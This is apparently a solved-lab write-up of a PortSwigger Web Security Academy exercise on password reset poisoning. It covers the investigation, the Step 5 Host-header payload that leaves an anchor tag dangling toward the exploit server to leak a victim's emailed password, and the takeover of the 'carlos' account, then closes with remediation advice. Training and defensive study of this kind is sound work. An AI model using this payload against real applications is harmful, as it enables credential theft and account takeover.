# Password Reset Poisoning via Dangling Markup

**Platform:** PortSwigger Web Security Academy
**Category:** Authentication Vulnerabilities
**Difficulty:** Expert
**Status:** ✅ Solved

## Overview

This lab's reset flow has no token at all: when a reset is requested, the application generates a **brand-new password** and emails it to the user in the body of the message. The email is rendered in a web-based email client that sanitizes HTML with DOMPurify — so script injection is stripped. However, the client also offers a **View Raw HTML** mode that displays the original email markup with no sanitization at all.

The second weakness is in how the reset email's link is built: part of the `Host` header — specifically its port — is reflected, unescaped, inside a single-quoted link in the email, immediately before the new password in the body. By smuggling markup into the port, an attacker can leave an anchor tag *dangling* (unterminated), so everything that follows in the email — including the victim's new password — becomes part of the link's `href`. When that raw HTML is viewed, the browser requests the attacker's server with the swallowed content in the URL, leaking the password into the attacker's access log.

## Lab Objective

Log in to Carlos's account by leaking the new password from his reset email into your exploit server's access log.

**Provided resources:** your credentials `wiener:peter`; emails to your account can be read via the email client on the exploit server.

<img width="2197" height="702" alt="step-1" src="https://github.com/user-attachments/assets/7d1d0491-b16e-4f9e-ae2d-dfd77f7b1eab" />

## Background: Why Dangling Markup Works Here

DOMPurify is a JavaScript library that removes dangerous HTML before content is rendered, so in the normal email view an injected tag would simply be stripped and nothing would execute. But the **raw HTML view** skips sanitization entirely: whatever HTML the email contains is displayed exactly as received. That asymmetry — sanitized in one view, raw in another — is what makes markup injection in emails dangerous even when a sanitizer is deployed.

## Walkthrough

### Step 1: Explore the Reset Flow

Request a password reset for your own account from the login page, then open the email client on the exploit server. Notice two unusual things about the reset email: the link in it just points to the generic login page, and there is **no reset token** — the new password itself is printed directly in the email body.

### Step 2: Study How the Email Client Renders HTML

In the proxy history, examine the response that serves the email. The email's HTML is passed through DOMPurify before rendering — but the client also offers a **View Raw HTML** option, and that raw view shows the email's markup completely unsanitized.

<img width="2982" height="1063" alt="step-2" src="https://github.com/user-attachments/assets/9606884a-b573-402e-9037-1b0a497a85c9" />

<img width="3825" height="701" alt="step-3" src="https://github.com/user-attachments/assets/13b4e1af-c8a6-4474-aed4-ad5596aa2da8" />

### Step 3: Probe the Host Header via Repeater

Send the `POST /forgot-password` request to Burp Repeater. Changing the domain in the `Host` header produces a server error — but adding an arbitrary, non-numeric **port** is accepted, and the reset email is still triggered:

```text
Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
```

<img width="2922" height="1363" alt="step-4" src="https://github.com/user-attachments/assets/11448f21-f0f1-41ce-bfca-fbfcac8462bc" />

### Step 4: Find the Reflection Point

In the email client, open the raw HTML view of the new email. The injected port value appears reflected inside a link as an unescaped, single-quoted string — and the new password appears in the email content shortly after it. That is the injection point: anything that breaks out of that quoted string lands in the email's markup, right before the password.

<img width="3190" height="887" alt="step-5" src="https://github.com/user-attachments/assets/d8c90623-831d-4727-a03a-eabce1d04384" />

<img width="3840" height="419" alt="step-6" src="https://github.com/user-attachments/assets/f8274ea0-0dc9-4b9f-835c-b8ed8ca835e2" />

### Step 5: Inject the Dangling Markup Payload

Send the reset request again, this time using the port position to close the quoted string and open an anchor tag that points at the exploit server but is never closed:

```text
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

Because the `<a>` tag dangles, the browser treats everything after it in the email — including the new password — as part of the `href` value, up to the next single quote in the markup.

<img width="3028" height="1558" alt="step-7" src="https://github.com/user-attachments/assets/24108a08-e0f7-432f-a66b-e6b589db3bb0" />

### Step 6: Confirm the Content Is Swallowed

Check the email client: the new email now appears with most of its content missing — it has been absorbed into the dangling link, exactly as intended.

<img width="3065" height="579" alt="step-8" src="https://github.com/user-attachments/assets/49e3a40c-6996-4022-a12a-55b2e5761ff0" />

### Step 7: Read Your Own Password from the Access Log

Open the exploit server's access log. There is a request beginning `GET /?/login'>[...]` whose URL contains the rest of the email body — including the new password. The technique is proven end to end on your own account.

<img width="3574" height="1426" alt="step-9" src="https://github.com/user-attachments/assets/8f4e5605-4cc1-4214-81ae-6f5aac0e4794" />

### Step 8: Repeat the Attack Against Carlos

In Repeater, send the same poisoned reset request one final time, but change the `username` parameter to `carlos`.

<img width="3017" height="1715" alt="step-10" src="https://github.com/user-attachments/assets/9a98421b-6696-4462-9a81-6cd8ecc3aeaf" />

### Step 9: Collect Carlos's New Password

Refresh the exploit server's access log and extract Carlos's new password from the leaked request URL.

<img width="3807" height="1130" alt="step-11" src="https://github.com/user-attachments/assets/51b5623b-c47a-4310-ad1a-8fc8bcba2e5e" />

### Step 10: Log In as Carlos

Log in with the username `carlos` and the password recovered from the access log. Reaching Carlos's **My account** page solves the lab.

<img width="3238" height="1529" alt="step-12" src="https://github.com/user-attachments/assets/15a0e1e5-52a5-4eb8-8110-b7dc60051162" />

## Key Takeaways

- Dangling markup injection needs no script execution: an unterminated tag turns subsequent page or email content into part of an attacker-controlled URL, which leaks as soon as anything requests it.
- "We sanitize with DOMPurify" is not a complete defense if any view, export, or client renders the same content raw. Sanitization must cover every rendering path.
- Reflecting any part of a request header into an email body unescaped creates an injection point — here, the `Host` header's port was enough.
- Emailing users a new password in plaintext is itself poor practice; a short-lived, single-use reset link avoids putting a live credential in an email body at all.

## Remediation

- Never reflect request data (including any part of the `Host` header) into emails without strict validation and output encoding; validate the port as numeric and the host against an allowlist.
- Sanitize HTML emails consistently on **every** display path — or remove raw-HTML views of untrusted content entirely.
- Prefer token-based reset links over sending new passwords by email; if a password must be sent, force a change at first login.
